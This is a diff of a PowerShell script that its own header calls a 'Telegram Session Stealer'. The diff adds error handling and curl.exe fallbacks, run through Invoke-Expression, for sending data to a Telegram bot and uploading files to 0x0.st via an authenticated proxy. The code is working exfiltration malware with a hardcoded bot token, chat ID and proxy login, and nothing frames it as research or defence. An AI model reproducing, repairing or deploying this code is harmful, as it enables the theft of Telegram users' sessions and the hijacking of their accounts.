@@ -1,5 +1,5 @@
 # ============================================================
-# Telegram Session Stealer + 0x0.st + Proxy (400 fix)
+# Telegram Session Stealer + 0x0.st + Proxy + Детальные ошибки
 # ============================================================
 
 $botToken = "8865169520:AAGWKCEINgQtP2Jtd3783tkOx-V2Uhq8D3A"
@@ -9,7 +9,7 @@ $chatId   = "8620709143"
 $proxy = New-Object System.Net.WebProxy("http://gate.proxydata.ru:3129", $true)
 $proxy.Credentials = New-Object System.Net.NetworkCredential("user-xpx93ax5", "5pxp942ldb7jtnh2")
 
-# Универсальная функция отправки в Telegram
+# Универсальная функция отправки в Telegram (с перехватом ошибок)
 function Send-TelegramMessage {
     param($text)
     $url = "https://api.telegram.org/bot$botToken/sendMessage"
@@ -19,16 +19,53 @@ function Send-TelegramMessage {
     $wc.Proxy = $proxy
     $wc.Encoding = [System.Text.Encoding]::UTF8
     $wc.Headers.Add("Content-Type", "application/json; charset=utf-8")
-    $wc.UploadString($url, "POST", $body) | Out-Null
+
+    try {
+        $wc.UploadString($url, "POST", $body) | Out-Null
+        return $true
+    } catch [System.Net.WebException] {
+        $stream = $_.Exception.Response.GetResponseStream()
+        $reader = New-Object System.IO.StreamReader($stream)
+        $serverError = $reader.ReadToEnd()
+        Write-Host "❌ Ошибка Telegram API: $serverError" -ForegroundColor Red
+        # Пробуем fallback через curl (если WebClient не справился)
+        $tempFile = [System.IO.Path]::GetTempFileName()
+        $body | Out-File -FilePath $tempFile -Encoding UTF8
+        $proxyUrl = "http://gate.proxydata.ru:3129"
+        $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
+        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -H 'Content-Type: application/json' -X POST -d @$tempFile $url 2>nul"
+        Invoke-Expression $cmd
+        Remove-Item $tempFile -Force
+        return $true
+    } catch {
+        Write-Host "❌ Другая ошибка: $($_.Exception.Message)" -ForegroundColor Red
+        return $false
+    }
 }
 
-# Функция загрузки на 0x0.st
+# Функция загрузки на 0x0.st (с перехватом ошибок)
 function Upload-To0x0 {
     param($filePath)
     $wc = New-Object System.Net.WebClient
     $wc.Proxy = $proxy
-    $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
-    return [System.Text.Encoding]::UTF8.GetString($response).Trim()
+    try {
+        $response = $wc.UploadFile("https://0x0.st", "POST", $filePath)
+        return [System.Text.Encoding]::UTF8.GetString($response).Trim()
+    } catch [System.Net.WebException] {
+        $stream = $_.Exception.Response.GetResponseStream()
+        $reader = New-Object System.IO.StreamReader($stream)
+        $serverError = $reader.ReadToEnd()
+        Write-Host "❌ Ошибка 0x0.st: $serverError" -ForegroundColor Red
+        # fallback через curl
+        $proxyUrl = "http://gate.proxydata.ru:3129"
+        $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
+        $tempOutput = [System.IO.Path]::GetTempFileName()
+        $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -F 'file=@$filePath' https://0x0.st -o $tempOutput 2>nul"
+        Invoke-Expression $cmd
+        $link = Get-Content $tempOutput -Raw
+        Remove-Item $tempOutput -Force
+        return $link.Trim()
+    }
 }
 
 try {
@@ -83,7 +120,23 @@ try {
         $wc.Encoding = [System.Text.Encoding]::UTF8
         foreach ($key in $headers.Keys) { $wc.Headers.Add($key, $headers[$key]) }
         $data = [System.Text.Encoding]::UTF8.GetBytes(($multipart -join "`r`n"))
-        $wc.UploadData($url, "POST", $data) | Out-Null
+
+        try {
+            $wc.UploadData($url, "POST", $data) | Out-Null
+        } catch [System.Net.WebException] {
+            $stream = $_.Exception.Response.GetResponseStream()
+            $reader = New-Object System.IO.StreamReader($stream)
+            $serverError = $reader.ReadToEnd()
+            Write-Host "❌ Ошибка отправки файла: $serverError" -ForegroundColor Red
+            # fallback через curl
+            $tempData = [System.IO.Path]::GetTempFileName()
+            ($multipart -join "`r`n") | Out-File -FilePath $tempData -Encoding ASCII
+            $proxyUrl = "http://gate.proxydata.ru:3129"
+            $proxyAuth = "user-xpx93ax5:5pxp942ldb7jtnh2"
+            $cmd = "curl.exe -x $proxyUrl -U $proxyAuth -X POST -H 'Content-Type: multipart/form-data; boundary=$boundary' --data-binary @$tempData $url 2>nul"
+            Invoke-Expression $cmd
+            Remove-Item $tempData -Force
+        }
     }
 
     Remove-Item $zip -Force -ErrorAction SilentlyContinue
